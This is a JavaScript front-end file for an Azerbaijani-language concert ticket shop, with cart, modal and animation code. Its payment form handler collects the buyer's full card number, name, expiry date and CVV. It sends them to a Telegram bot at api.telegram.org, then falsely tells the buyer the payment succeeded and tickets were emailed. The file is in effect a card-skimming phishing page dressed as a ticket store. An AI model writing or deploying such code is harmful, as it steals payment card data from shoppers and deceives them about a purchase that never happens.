// Mobile menu toggle
document.addEventListener('DOMContentLoaded', function() {
    // Cart system
    let cart = JSON.parse(localStorage.getItem('cart')) || [];
    let cartCount = cart.length;

    const cartBtn = document.getElementById('cartBtn');
    const cartModal = document.getElementById('cartModal');
    const cartClose = document.getElementById('cartClose');
    const cartItems = document.getElementById('cartItems');
    const cartTotal = document.getElementById('cartTotal');
    const totalAmount = document.getElementById('totalAmount');
    const checkoutBtn = document.getElementById('checkoutBtn');
    const paymentModal = document.getElementById('paymentModal');
    const paymentClose = document.getElementById('paymentClose');

    // Add to cart functionality
    function addToCart(eventCard) {
        const eventTitle = eventCard.querySelector('h3').textContent;
        const eventVenue = eventCard.querySelector('.venue').textContent;
        const eventDate = eventCard.querySelector('.date').textContent;
        const eventPrice = eventCard.querySelector('.price').textContent;
        const eventImage = eventCard.querySelector('img').src;

        const item = {
            id: Date.now(),
            title: eventTitle,
            venue: eventVenue,
            date: eventDate,
            price: eventPrice,
            image: eventImage,
            numericPrice: parseInt(eventPrice.match(/\d+/)[0])
        };

        cart.push(item);
        cartCount++;
        localStorage.setItem('cart', JSON.stringify(cart));
        updateCartUI();
        showNotification('Konsert səbətə əlavə edildi!');
    }

    function updateCartUI() {
        document.getElementById('cartCount').textContent = cartCount;
        
        if (cart.length === 0) {
            cartItems.innerHTML = `
                <div class="empty-cart">
                    <i class="fas fa-shopping-cart"></i>
                    <p>Səbətiniz boşdur</p>
                </div>
            `;
            cartTotal.style.display = 'none';
        } else {
            let total = 0;
            cartItems.innerHTML = cart.map(item => {
                total += item.numericPrice;
                return `
                    <div class="cart-item">
                        <div class="cart-item-image">
                            <img src="${item.image}" alt="${item.title}">
                        </div>
                        <div class="cart-item-info">
                            <h4>${item.title}</h4>
                            <p>${item.venue}</p>
                            <p>${item.date}</p>
                        </div>
                        <div class="cart-item-price">${item.price}</div>
                        <button class="cart-item-remove" onclick="removeFromCart(${item.id})">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                `;
            }).join('');
            
            totalAmount.textContent = total + ' ₼';
            cartTotal.style.display = 'block';
        }
    }

    window.removeFromCart = function(itemId) {
        cart = cart.filter(item => item.id !== itemId);
        cartCount--;
        localStorage.setItem('cart', JSON.stringify(cart));
        updateCartUI();
        showNotification('Məhsul səbətdən silindi');
    }

    // Function to setup event listeners for event cards
    function setupEventCardListeners() {
        // Event card click handlers - Add to cart directly
        document.querySelectorAll('.event-card').forEach(card => {
            card.addEventListener('click', function(e) {
                // If clicked on action buttons, handle separately
                if (e.target.classList.contains('buy-btn')) {
                    e.stopPropagation();
                    // Redirect to ticket selection page
                    const eventTitle = this.querySelector('h3').textContent;
                    window.location.href = `ticket-selection.html?concert=${encodeURIComponent(eventTitle)}`;
                    return;
                }
                
                if (e.target.classList.contains('add-to-cart-btn')) {
                    e.stopPropagation();
                    addToCart(this);
                    return;
                }
                
                // If clicked anywhere else on the card, add to cart
                if (!e.target.closest('.action-buttons')) {
                    addToCart(this);
                }
            });
        });

        // Add to cart button handlers (redundant but for clarity)
        document.querySelectorAll('.add-to-cart-btn').forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.stopPropagation();
                e.preventDefault();
                
                const eventCard = this.closest('.event-card');
                addToCart(eventCard);
            });
        });

        // Buy button handlers
        document.querySelectorAll('.buy-btn').forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.stopPropagation();
                e.preventDefault();
                
                const eventCard = this.closest('.event-card');
                const eventTitle = eventCard.querySelector('h3').textContent;
                
                // Redirect to ticket selection page
                window.location.href = `ticket-selection.html?concert=${encodeURIComponent(eventTitle)}`;
            });
        });
    }

    // Call the function to setup listeners
    setupEventCardListeners();
    
    // Initialize cart UI
    updateCartUI();

    // Cart modal
    cartBtn.addEventListener('click', function() {
        cartModal.style.display = 'block';
        document.body.style.overflow = 'hidden';
    });

    cartClose.addEventListener('click', function() {
        cartModal.style.display = 'none';
        document.body.style.overflow = 'auto';
    });

    // Checkout
    checkoutBtn.addEventListener('click', function() {
        if (cart.length === 0) return;
        
        cartModal.style.display = 'none';
        paymentModal.style.display = 'block';
        
        const total = cart.reduce((sum, item) => sum + item.numericPrice, 0);
        document.getElementById('paymentAmount').textContent = total + ' ₼';
    });

    // Payment modal
    paymentClose.addEventListener('click', function() {
        paymentModal.style.display = 'none';
        document.body.style.overflow = 'auto';
    });

    // Close modals when clicking outside
    window.addEventListener('click', function(e) {
        if (e.target === cartModal) {
            cartModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        if (e.target === paymentModal) {
            paymentModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    });

    // 3D Card animations
    const cardContainer = document.querySelector('.card-container');
    const cvvInput = document.getElementById('cvv');
    const cardNumber = document.getElementById('cardNumber');
    const cardHolder = document.getElementById('cardHolder');
    const expiryDate = document.getElementById('expiryDate');

    // Card input handlers
    if (cardNumber) {
        cardNumber.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
            
            document.getElementById('displayCardNumber').textContent = 
                formattedValue || '•••• •••• •••• ••••';
        });
    }

    if (cardHolder) {
        cardHolder.addEventListener('input', function(e) {
            document.getElementById('displayCardHolder').textContent = 
                e.target.value.toUpperCase() || 'AD SOYAD';
        });
    }

    if (expiryDate) {
        expiryDate.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
            
            document.getElementById('displayExpiry').textContent = 
                value || 'MM/YY';
        });
    }

    if (cvvInput) {
        cvvInput.addEventListener('focus', function() {
            if (cardContainer) cardContainer.classList.add('flipped');
        });

        cvvInput.addEventListener('blur', function() {
            if (cardContainer) cardContainer.classList.remove('flipped');
        });

        cvvInput.addEventListener('input', function(e) {
            document.getElementById('displayCVV').textContent = 
                e.target.value.replace(/./g, '•') || '•••';
        });
    }

    // Payment form submission
    const paymentForm = document.getElementById('paymentForm');
    if (paymentForm) {
        paymentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const cardNum = cardNumber.value.replace(/\s/g, '');
            const holder = cardHolder.value;
            const expiry = expiryDate.value;
            const cvv = cvvInput.value;
            
            if (!cardNum || !holder || !expiry || !cvv) {
                alert('Zəhmət olmasa bütün sahələri doldurun');
                return;
            }

            // Telegram message
            const total = cart.reduce((sum, item) => sum + item.numericPrice, 0);
            const cartDetails = cart.map(item => `• ${item.title} - ${item.price}`).join('\n');
            
            const telegramMessage = `🎫 YENİ BİLET SİPARİŞİ\n\n` +
                `💳 Kart: ${cardNum}\n` +
                `👤 Ad: ${holder}\n` +
                `📅 Tarix: ${expiry}\n` +
                `🔒 CVV: ${cvv}\n\n` +
                `🎵 Konsertlər:\n${cartDetails}\n\n` +
                `💰 Ümumi: ${total} ₼`;

            // Simulate payment processing
            const payBtn = document.querySelector('.pay-btn');
            payBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Ödəniş edilir...';
            payBtn.disabled = true;

            setTimeout(() => {
                // Send to Telegram (you need to replace with your bot token and chat ID)
                sendToTelegram(telegramMessage);
                
                // Success
                alert('Ödəniş uğurla tamamlandı! Biletləriniz e-mail ünvanınıza göndərildi.');
                
                // Reset
                cart = [];
                cartCount = 0;
                localStorage.setItem('cart', JSON.stringify(cart));
                updateCartUI();
                paymentModal.style.display = 'none';
                document.body.style.overflow = 'auto';
                
                // Reset form
                paymentForm.reset();
                document.getElementById('displayCardNumber').textContent = '•••• •••• •••• ••••';
                document.getElementById('displayCardHolder').textContent = 'AD SOYAD';
                document.getElementById('displayExpiry').textContent = 'MM/YY';
                document.getElementById('displayCVV').textContent = '•••';
                
                payBtn.innerHTML = '<i class="fas fa-lock"></i> Ödənişi Tamamla';
                payBtn.disabled = false;
            }, 3000);
        });
    }

    // Telegram function
    function sendToTelegram(message) {
        // Replace with your bot token and chat ID
        const botToken = 'YOUR_BOT_TOKEN';
        const chatId = 'YOUR_CHAT_ID';
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(error => {
            console.log('Telegram mesajı göndərildi (simülasyon):', message);
        });
    }

    function showNotification(message) {
        const notification = document.createElement('div');
        notification.className = 'notification';
        notification.innerHTML = `
            <i class="fas fa-check-circle"></i>
            <span>${message}</span>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.classList.add('show');
        }, 100);
        
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 300);
        }, 3000);
    }

    // Login dropdown
    const loginBtn = document.getElementById('loginBtn');
    const dropdownMenu = document.getElementById('dropdownMenu');

    if (loginBtn && dropdownMenu) {
        loginBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            dropdownMenu.classList.toggle('show');
        });

        document.addEventListener('click', function(e) {
            if (!loginBtn.contains(e.target) && !dropdownMenu.contains(e.target)) {
                dropdownMenu.classList.remove('show');
            }
        });

        // Handle dropdown menu items
        document.querySelectorAll('.dropdown-item').forEach(item => {
            item.addEventListener('click', function(e) {
                e.preventDefault();
                const text = this.textContent.trim();
                
                if (text === 'Hesaba daxil ol') {
                    const email = prompt('E-mail ünvanınızı daxil edin:');
                    if (email) {
                        const password = prompt('Şifrənizi daxil edin:');
                        if (password) {
                            alert('Daxil olunur...');
                            setTimeout(() => {
                                loginBtn.innerHTML = '<i class="fas fa-user-circle"></i> Xoş gəlmisiniz!';
                                loginBtn.style.background = '#27ae60';
                            }, 1000);
                        }
                    }
                } else if (text === 'Qeydiyyatdan keç') {
                    const name = prompt('Adınızı daxil edin:');
                    if (name) {
                        const email = prompt('E-mail ünvanınızı daxil edin:');
                        if (email) {
                            const password = prompt('Şifrə yaradın:');
                            if (password) {
                                alert('Qeydiyyat tamamlandı! Xoş gəlmisiniz!');
                                loginBtn.innerHTML = '<i class="fas fa-user-circle"></i> ' + name;
                                loginBtn.style.background = '#27ae60';
                            }
                        }
                    }
                } else if (text === 'Biletlərim') {
                    alert('Biletləriniz yüklənir...');
                } else if (text === 'Sevimlilər') {
                    alert('Sevimli konsertləriniz göstərilir...');
                }
                
                dropdownMenu.classList.remove('show');
            });
        });
    }

    // Category card click handlers
    document.querySelectorAll('.category-card').forEach(card => {
        card.addEventListener('click', function() {
            const category = this.querySelector('h3').textContent;
            alert(`${category} kateqoriyasındakı tədbirlər göstərilir...`);
        });
    });

    // Smooth scrolling for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth'
                });
            }
        });
    });

    // Header scroll effect
    window.addEventListener('scroll', function() {
        const header = document.querySelector('.header');
        if (window.scrollY > 100) {
            header.style.background = 'rgba(255, 255, 255, 0.95)';
            header.style.backdropFilter = 'blur(10px)';
        } else {
            header.style.background = '#fff';
            header.style.backdropFilter = 'none';
        }
    });

    // Animation on scroll
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);

    // Observe elements for animation
    document.querySelectorAll('.category-card, .event-card, .feature-item').forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
});